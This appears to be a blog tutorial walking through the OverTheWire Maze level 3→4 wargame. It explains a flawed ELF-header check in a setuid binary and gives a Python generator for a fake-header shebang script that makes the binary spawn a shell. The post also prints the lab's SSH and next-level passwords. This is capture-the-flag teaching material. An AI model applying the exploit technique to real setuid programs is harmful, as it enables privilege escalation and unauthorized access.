---
date: 2023-09-21 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 3 → 4 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-3-to-4/
tags: [overthewire, maze, pwn, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Maze Level 3 → 4!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Maze-Level-2-to-3/' | relative_url }}">← Previous: Level 2 → 3</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze4.html" target="_blank" rel="noopener">
      Official (Level 4) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-4-to-5/' | relative_url }}">Next: Level 4 → 5 →</a>
  </div>
</nav>

## Login

Use the **maze3** account from the previous level.

```bash
ssh maze3@maze.labs.overthewire.org -p <PORT>
# password: deekaihiek
````

> Binary for this challenge: `/maze/maze4`

---

## Task

Abuse `/maze/maze4`’s ELF-parsing checks to make it **exec a file of our choosing**, then read `/etc/maze_pass/maze4`.

---

## A little bit of Theory

`maze4` opens the file you provide and **pretends** it’s an ELF. It reads the first 52 bytes into an `Elf32_Ehdr` (header) and then, using `ehdr.e_phoff`, seeks and reads 32 bytes into an `Elf32_Phdr` (program header). Then it validates:

```c
// pseudo-code (decompiled)
read(fd, &ehdr, 52);
lseek(fd, ehdr.e_phoff, SEEK_SET);
read(fd, &phdr, 32);

if (phdr.p_paddr == ehdr.e_ident[8] * ehdr.e_ident[7]  &&  st.st_size < 120) {
    puts("valid file, executing");
    execv(argv[1], NULL);
} else {
    fwrite("file not executed\n", 1, 18, stderr);
}
```

Notes:

* `ehdr.e_ident[7]` and `[8]` are bytes 7 and 8 of the file. In a real ELF these are **OSABI** and **ABIVERSION**, but here they’re just “whatever’s at offsets 7 and 8”.
* `phdr.p_paddr` is a 32-bit value located **12 bytes** into the 32-byte `Elf32_Phdr`.
* The file must be **< 120 bytes**.
* If the check passes, `execv(argv[1], NULL)` runs your file. If it starts with a shebang, the kernel will treat it as a script.

The trick: craft a tiny text file whose bytes satisfy the math, then make it a **script that spawns `/bin/sh`**.

---

## Walkthrough

### 1) Decide the values for the check

Let’s make the first 10 bytes a shebang line:

```
0..9:  "#!/bin/sh\n"
```

Those bytes at offsets 7 and 8 are:

* offset 7 = `'s'` = `0x73`
* offset 8 = `'h'` = `0x68`

So the product is:

```
0x73 * 0x68 = 0x2eb8
```

Therefore we must set **`phdr.p_paddr = 0x00002eb8`**.

### 2) Make `ehdr.e_phoff` point where we place `phdr`

`e_phoff` is at offset **0x1c (28)** inside the first 52 bytes. We’ll put the value `0x20` so the second read starts at file offset **0x20**.

### 3) Lay out the file

Plan (little-endian):

```
[ 0x00 ] "#!/bin/sh\n"           (10 bytes — gives 's' and 'h' at offsets 7 & 8)
[ 0x0A ] "/bin/sh\n"             (9 bytes — body of the script)
[ 0x13 ] "A"*??                  (pad so that offset 0x1c is next)
[ 0x1C ] e_phoff = "\x20\x00\x00\x00"  (seek to 0x20 for phdr)
[ 0x20 ] phdr (32 bytes total):
         "B"*12                  (p_type,p_offset,p_vaddr padding)
         p_paddr = "\xb8\x2e\x00\x00"  (0x2eb8 little-endian)
         "B"*16                  (rest of phdr)
```

One-liner to generate such a file:

```bash
python - <<'PY' > /tmp/hello
import sys
out  = b"#!/bin/sh\n"          # 0..9
out += b"/bin/sh\n"            # 10..18 -> simple script body
# pad up to 0x1c (28)
out += b"A" * (0x1c - len(out))
# ehdr.e_phoff = 0x20
out += b"\x20\x00\x00\x00"
# At 0x20: fake phdr (32 bytes)
out += b"B"*12                  # p_type,p_offset,p_vaddr
out += b"\xb8\x2e\x00\x00"      # p_paddr = 0x2eb8
out += b"B"*16                  # rest of the phdr
sys.stdout.buffer.write(out)
PY
chmod +x /tmp/hello
```

This file is well under 120 bytes.

### 4) Trigger `maze4` and pop a shell

```bash
/maze/maze4 /tmp/hello
# prints: valid file, executing
# …and because it's a script that runs /bin/sh, you now have a shell
```

Dump the next password:

```bash
id
cat /etc/maze_pass/maze4
```

In my run, the password was:

```
ishipaeroo
```

---

## Why this works (tl;dr)

* We **fake** an ELF header in the first 52 bytes.
* By choosing a shebang `#!/bin/sh\n`, the bytes at offsets 7 and 8 are `'s'` and `'h'`, so their product is `0x2eb8`.
* We set `ehdr.e_phoff = 0x20` and place a fake `Elf32_Phdr` there with `p_paddr = 0x2eb8`.
* File size < 120 → all checks pass → program calls `execv` on our file.
* Kernel treats it as a script and executes `/bin/sh`, which gives us a shell.

---

## Troubleshooting quick tips

* If you see `file not executed`, recheck:

  * `len(file) < 120`
  * At offset 0x1c you really wrote `\x20\x00\x00\x00`
  * At offset 0x20+12 you really wrote `\xb8\x2e\x00\x00`
* Make sure the file is executable: `chmod +x /tmp/hello`.
* Remember **little-endian** when writing integers.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

